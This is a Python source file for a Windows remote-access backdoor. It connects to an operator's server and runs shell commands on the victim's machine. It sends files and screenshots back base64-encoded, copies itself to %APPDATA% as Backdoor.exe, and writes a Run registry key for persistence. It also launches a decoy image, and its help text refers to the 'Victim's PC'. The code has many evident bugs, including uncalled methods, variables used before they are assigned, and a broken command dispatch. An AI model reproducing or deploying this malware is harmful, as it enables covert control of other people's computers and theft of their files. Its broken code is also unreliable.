#!/usr/bin/python3

import socket
import requests 
import json 
import base64
import os
import time
import shutil
import sys
import ctypes
import subprocess
from mss import mss

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)   #TCP-подключение через IPv4

def data_send(data):
    json_data = json.dumps(data)
    sock.send(json_data.encode())

def data_recv():
    json_data = b""
    while True:
        try:
            recv = sock.recv(1024)
            if not recv:
                break
            json_data += recv
            json.loads(json_data.decode())
        except ValueError:
            continue

def connection(IP, port):
    while True:
        time.sleep(5)
        try:
            sock.connect((IP , port))
            shell()
        except:
            data_send("~[*] Something is Wrong... Please Try Again")
            connection(IP, port)

    
def cd_command(command):
	try:
		os.chdir(command[3:])
	except:
		data_send("~[*]Failed to Change Directory")
		pass

def download_command(command):
      try:
            with open(command[9:], "rb") as file:
                  data_send(base64.b64encode(file.read))
      except: 
        data_send("~[*]Failed to Dowload")
        pass

def upload_command(command):
       try:
            with open(command[7:], "rb") as file:
                data_send(base64.b64encode(file.read))
       except:
            failed ="~[*]Failed to Upload"
            data_send(base64.b64decode(failed)) 

def get_command(command):
      response = requests.get(command[:4])
      try:
            download_result = requests.get(command[4:])
            if response.status_code == 200:
                      with open("download_result", "wb") as f:
                            f.write(response.content)
                            print("File downloaded successfully.")
            else:
                print("~[*]Failed to download file.")
      except:
            data_send("~[*]Failed to dowload")

def start_command(command):
      subprocess.Popen(command[6:], shell = True)
      data_send("~[*]Started")

def screenshot_command(command):
      try:
        screenshot()
        with open("monitor-1.png", "rb") as sc:
            data_send(base64.b64encode(sc.read()))
            os.remove("monitor-1.png")
      except:
        data_send("~[*]Failed to save screenshot")

def check_command(command):
      try:
            admin_check()
            data_send(admin)
      except:
            data_send("~[*]Failed to check")

def help_command(command):
      help_opt = '''                                          download ---> Dowload File From Victim's PC to Server
                 upload ---> Upload File From Server to Victim's PC
                 get ---> Download File From Link
                 start ---> Start Program on Victim's PC
                 screenshot ---> Take a Screenshot on Victim's PC
                 check ---> Check Privileges 
                 q ---> Quit'''
      data_send(help_opt)


command_options = {
      "cd" : cd_command,
      "download" : download_command,
      "upload" : upload_command,
      "get" : get_command,
      "start" : start_command,
      "screenshot" :screenshot_command,
      "check" : check_command,
      "help" : help_command}

def shell():
      while True:
            if command == "q" :
                  break
            else:
                  command = command_options.get(command)
                  if command_options:
                        command_options(command)
                  else:
                        try:
                            proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                            result = proc.stdout.read() + proc.stderr.read()
                            data_send(result.decode())
                        except Exception as e:
                              data_send(str(e))


def screenshot():
	with mss() as screenshot:
		screenshot.shot()      

def admin_check():
    global admin
    try:
          temp = os.listdir(os.sep.join(([os.environ.get('SystemRoot' , 'C"\\windows', 'temp')])))
    except:
        admin = False
    else:
        admin = True
if admin == True:
      print("[+] Administrator Privileges")
else:
      print("[-] User Privileges") 

location = os.environ("appdata")+"\\Backdoor.exe"  #заражаем устройство и делаем код     персистентным
if not os.path.exists(location):
	shutil.copyfile(sys.executable, location)
	subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Backdoor /t REG_SZ /d "'+ location + '"', shell = True)
	image = input("Name of image: ", )
    name = os.path.join(sys.MEIPASS, image)
    
    try:
        subprocess.Popen(name, shell = True)
    except:
     num = 3

if __name__ == "__main__":
    IP = input("Server IP: ")
    port = int(input("Destination Port: "))
    
    connection(IP, port)
    
    admin_check()
    sock.close()

